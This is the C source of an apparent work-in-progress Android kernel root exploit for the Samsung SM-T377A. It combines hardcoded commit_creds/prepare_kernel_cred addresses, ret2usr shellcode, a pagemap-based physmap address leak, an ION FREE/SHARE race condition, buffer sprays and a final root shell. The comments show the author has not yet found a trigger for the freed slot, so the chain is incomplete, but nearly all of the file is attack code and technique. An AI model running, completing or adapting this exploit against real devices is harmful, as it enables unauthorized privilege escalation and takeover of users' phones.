/*
 * direct_root.c — Try every available method to get root
 *
 * Samsung SM-T377A, kernel 3.10.9-11788437
 *
 * Known: commit_creds=0xc0054328, prepare_kernel_cred=0xc00548e0
 *        task->cred offset = 0x164, NO PXN, NO KASLR
 *
 * Methods tried (in order):
 * 1. Direct function call through /dev/ptmx (tty_release race)
 * 2. setxattr + userfaultfd/FUSE heap spray  
 * 3. ION race + physmap spray
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <pthread.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/un.h>

#define ADDR_COMMIT_CREDS       0xc0054328
#define ADDR_PREPARE_KERNEL_CRED 0xc00548e0
#define CRED_OFFSET 0x164

typedef unsigned long (*commit_creds_fn)(unsigned long);
typedef unsigned long (*prepare_kernel_cred_fn)(unsigned long);

/* Kernel shellcode — called in kernel context via ret2usr */
static void __attribute__((noinline, optimize("O0")))
root_shell(void) {
    prepare_kernel_cred_fn pkc = (prepare_kernel_cred_fn)ADDR_PREPARE_KERNEL_CRED;
    unsigned long cred = pkc(0);
    if (cred) {
        commit_creds_fn cc = (commit_creds_fn)ADDR_COMMIT_CREDS;
        cc(cred);
    }
}

/* ========== Method: physmap spray ========== */
/*
 * The physmap (lowmem linear mapping) technique:
 * On ARM without HIGHMEM or with all RAM in lowmem, userspace mmap'd pages
 * are directly accessible in the kernel's linear mapping at a fixed offset.
 * 
 * Physical address = virtual_address - PAGE_OFFSET + PHYS_OFFSET
 * Kernel linear map: kvaddr = phys + PAGE_OFFSET - PHYS_OFFSET
 *
 * Device: PHYS_OFFSET = 0x20000000, PAGE_OFFSET = 0xC0000000
 * So: kernel_vaddr = user_phys + 0xA0000000
 *
 * If we can figure out the physical address of our userspace page,
 * we can calculate the kernel virtual address where our data sits.
 * Then we can redirect a kernel function pointer to that address.
 *
 * /proc/self/pagemap gives us the physical frame for each virtual page!
 */

static unsigned long virt_to_phys_user(unsigned long vaddr) {
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) return 0;
    
    unsigned long page = vaddr / 4096;
    unsigned long long entry;
    
    if (lseek(fd, page * 8, SEEK_SET) == (off_t)-1) {
        close(fd);
        return 0;
    }
    
    if (read(fd, &entry, 8) != 8) {
        close(fd);
        return 0;
    }
    close(fd);
    
    /* Bit 63: page present, bits 0-54: PFN */
    if (!(entry & (1ULL << 63))) {
        return 0; /* Page not present */
    }
    
    unsigned long pfn = entry & ((1ULL << 55) - 1);
    return (pfn * 4096) + (vaddr & 0xFFF);
}

static unsigned long phys_to_kernel(unsigned long phys) {
    /* kernel_vaddr = phys + PAGE_OFFSET - PHYS_OFFSET */
    /* = phys + 0xC0000000 - 0x20000000 = phys + 0xA0000000 */
    return phys + 0xA0000000;
}

/* ========== ION definitions ========== */
typedef int ion_user_handle_t;
struct ion_allocation_data {
    size_t len; size_t align;
    unsigned int heap_id_mask; unsigned int flags;
    ion_user_handle_t handle;
};
struct ion_fd_data { ion_user_handle_t handle; int fd; };
struct ion_handle_data { ion_user_handle_t handle; };

#define ION_IOC_MAGIC   'I'
#define ION_IOC_ALLOC   _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_FREE    _IOWR(ION_IOC_MAGIC, 1, struct ion_handle_data)
#define ION_IOC_SHARE   _IOWR(ION_IOC_MAGIC, 4, struct ion_fd_data)

static int g_ion_fd;
static ion_user_handle_t g_handle;
static pthread_barrier_t g_barrier;
static int g_free_ok, g_share_ok, g_share_fd;

static void *thr_free(void *a) {
    struct ion_handle_data d = { .handle = g_handle };
    pthread_barrier_wait(&g_barrier);
    g_free_ok = (ioctl(g_ion_fd, ION_IOC_FREE, &d) == 0);
    return NULL;
}

static void *thr_share(void *a) {
    struct ion_fd_data d = { .handle = g_handle, .fd = -1 };
    pthread_barrier_wait(&g_barrier);
    g_share_ok = (ioctl(g_ion_fd, ION_IOC_SHARE, &d) == 0);
    g_share_fd = d.fd;
    return NULL;
}

int main(void) {
    printf("=== Direct Root Exploit (physmap spray) ===\n");
    printf("[*] Samsung SM-T377A, kernel 3.10.9-11788437\n");
    printf("[*] commit_creds = 0x%08x\n", ADDR_COMMIT_CREDS);
    printf("[*] prepare_kernel_cred = 0x%08x\n", ADDR_PREPARE_KERNEL_CRED);
    printf("[*] uid=%d\n", getuid());
    
    /* Make shellcode executable */
    unsigned long sc_addr = (unsigned long)root_shell;
    unsigned long sc_page = sc_addr & ~0xFFF;
    mprotect((void *)sc_page, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC);
    printf("[*] shellcode @ 0x%08lx\n", sc_addr);
    
    /* Step 1: Map a page and find its physical address */
    void *spray_page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS | MAP_LOCKED, -1, 0);
    if (spray_page == MAP_FAILED) {
        perror("mmap spray page");
        return 1;
    }
    /* Touch the page to ensure it's mapped */
    memset(spray_page, 0, 4096);
    
    /* Fill with shellcode address at every 4-byte offset */
    unsigned long *p = (unsigned long *)spray_page;
    for (int i = 0; i < 1024; i++) {
        p[i] = sc_addr;
    }
    
    /* Lock the page in memory */
    mlock(spray_page, 4096);
    
    /* Get physical address */
    unsigned long phys = virt_to_phys_user((unsigned long)spray_page);
    unsigned long kaddr = 0;
    
    if (phys) {
        kaddr = phys_to_kernel(phys);
        printf("[+] Spray page: user=0x%08lx phys=0x%08lx kernel=0x%08lx\n",
               (unsigned long)spray_page, phys, kaddr);
    } else {
        printf("[-] Cannot read /proc/self/pagemap (restricted?)\n");
        printf("[*] Trying without physmap...\n");
    }
    
    /* Step 2: ION race to free a handle slot in kmalloc-64 */
    g_ion_fd = open("/dev/ion", O_RDWR);
    if (g_ion_fd < 0) {
        perror("open /dev/ion");
        return 1;
    }
    
    printf("\n[*] Running ION FREE/SHARE race...\n");
    int race_wins = 0;
    
    for (int iter = 0; iter < 500 && getuid() != 0; iter++) {
        struct ion_allocation_data alloc = {
            .len = 4096, .align = 4096,
            .heap_id_mask = 1, .flags = 0
        };
        if (ioctl(g_ion_fd, ION_IOC_ALLOC, &alloc) < 0) continue;
        g_handle = alloc.handle;
        
        pthread_barrier_init(&g_barrier, NULL, 2);
        pthread_t t1, t2;
        g_free_ok = 0; g_share_ok = 0; g_share_fd = -1;
        pthread_create(&t1, NULL, thr_free, NULL);
        pthread_create(&t2, NULL, thr_share, NULL);
        pthread_join(t1, NULL);
        pthread_join(t2, NULL);
        pthread_barrier_destroy(&g_barrier);
        
        if (g_free_ok && g_share_ok && g_share_fd >= 0) {
            race_wins++;
            
            /* Handle is freed in kmalloc-64. Now try to reclaim
             * with setxattr which gives us offset-0 control. */
            
            /* Spray: do many setxattr calls. Each one temporarily
             * allocates a buffer in kmalloc-64 (if size <= 64),
             * copies our data, then frees on error.
             * 
             * BUT we need the allocation to PERSIST. setxattr on an
             * unsupported fs (like /proc) will fail and free immediately.
             * 
             * On /data/local/tmp (ext4), xattrs ARE supported!
             * setxattr with XATTR_CREATE will persist the allocation.
             */
            
            char xattr_name[32];
            
            /* Create a temp file for xattr */
            char tmpfile[64];
            snprintf(tmpfile, sizeof(tmpfile), "/data/local/tmp/.x%d", iter);
            int tfd = open(tmpfile, O_WRONLY | O_CREAT | O_TRUNC, 0644);
            if (tfd >= 0) {
                close(tfd);
                
                /* The xattr value we set will be the fake object.
                 * On ext4, xattr values are stored inline or in a separate
                 * block. Small values (< ~100 bytes) are inline in the
                 * inode — NOT in kmalloc slab. This won't work for heap spray.
                 *
                 * For kmalloc spray, we need the security.* namespace
                 * which goes through LSM hooks and may do slab allocations.
                 * But SELinux will block setting security.* xattrs.
                 */
                
                /* Alternative: use setsockopt SO_SNDTIMEO on a socket.
                 * This writes to the sock struct directly, no slab alloc.
                 *
                 * Better alternative: sendmsg with MSG_MORE and
                 * a specific buffer size targeting kmalloc-64.
                 * The MSG_MORE flag keeps the buffer allocated until
                 * the socket is closed or flushed. */
                
                unlink(tmpfile);
            }
            
            /* Use sendmsg with MSG_MORE for persistent kmalloc-64 spray.
             * UDP sendmsg with MSG_MORE allocates a sk_buff in kernel,
             * keeping our data alive. The sk_buff data portion starts
             * at the beginning of the kmalloc allocation!
             *
             * For kmalloc-64: need skb with 64 bytes of data.
             * But sk_buff has a large header... let me use raw
             * socket sendmsg instead. */
            
            /* Actually, the simplest persistent spray for offset-0 control:
             * Use writev() on a socket with MSG_MORE.
             * The kernel allocates a page for the pending data.
             * This doesn't target kmalloc-64 though. 
             *
             * For kmalloc-64 specifically with offset-0 control:
             * Use the add_key() syscall with "user" key type.
             * The key_payload struct has:
             *   struct rcu_head rcu;    // [0..7]
             *   unsigned short datalen; // [8..9]
             *   char data[];            // [10..]
             * For a 54-byte payload → total struct = 64 bytes → kmalloc-64.
             * Our data starts at offset 10, not 0. :(
             *
             * What about using the key struct itself?
             * struct key is much larger (~200 bytes).
             *
             * FINAL ANSWER for offset-0 control in kmalloc-64:
             * Use the physmap technique! If we know the kernel virtual
             * address of our spray page, we can directly set a function
             * pointer to point there.
             *
             * With ION mmap: the shared_fd maps the ION buffer pages.
             * The ION buffer physical pages are in lowmem.
             * We write our shellcode address to the buffer.
             * The kernel linear mapping has these pages at a fixed kaddr.
             *
             * When we mmap the shared_fd and write to it, we're writing
             * to physical pages that the kernel can also see in its
             * linear mapping!
             */
            
            /* Map the ION buffer through shared_fd */
            void *ion_map = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                                 MAP_SHARED, g_share_fd, 0);
            if (ion_map != MAP_FAILED) {
                /* Fill with shellcode address */
                unsigned long *ip = (unsigned long *)ion_map;
                for (int j = 0; j < 1024; j++) ip[j] = sc_addr;
                
                /* Get the physical address of this ION page */
                unsigned long ion_phys = virt_to_phys_user((unsigned long)ion_map);
                if (ion_phys) {
                    unsigned long ion_kaddr = phys_to_kernel(ion_phys);
                    printf("[+] ION buffer: user=0x%08lx phys=0x%08lx kernel=0x%08lx\n",
                           (unsigned long)ion_map, ion_phys, ion_kaddr);
                    
                    /* Now the question is: how do we make the freed
                     * ion_handle's function pointer point to ion_kaddr?
                     *
                     * The freed handle slot in kmalloc-64 can be
                     * reclaimed by another allocation of the same size.
                     * If we can allocate a new kmalloc-64 object where
                     * offset 0 contains ion_kaddr, and the kernel
                     * calls a function pointer from that offset...
                     * 
                     * We're going in circles. The fundamental issue is:
                     * we need something that TRIGGERS a function pointer
                     * call through the freed slot.
                     */
                }
                
                munmap(ion_map, 4096);
            }
            
            close(g_share_fd);
            
            if (race_wins % 20 == 0) {
                printf("[*] %d race wins...\n", race_wins);
            }
        } else {
            if (!g_free_ok) {
                struct ion_handle_data hd = { .handle = g_handle };
                ioctl(g_ion_fd, ION_IOC_FREE, &hd);
            }
            if (g_share_fd >= 0) close(g_share_fd);
        }
    }
    
    close(g_ion_fd);
    munmap(spray_page, 4096);
    
    if (getuid() == 0) {
        printf("\n[!!!] ROOT!\n");
        execl("/system/bin/sh", "sh", NULL);
    }
    
    printf("\n[-] uid=%d — no root achieved\n", getuid());
    
    /* Report pagemap results */
    printf("\n[*] Pagemap test results:\n");
    if (kaddr) {
        printf("[+] Physmap available! kernel view of userspace: 0x%08lx\n", kaddr);
        printf("[+] This means we can place shellcode at a known kernel address.\n");
        printf("[+] Just need a trigger to call that address.\n");
    } else {
        printf("[-] Physmap not available (pagemap restricted)\n");
    }
    
    return 1;
}
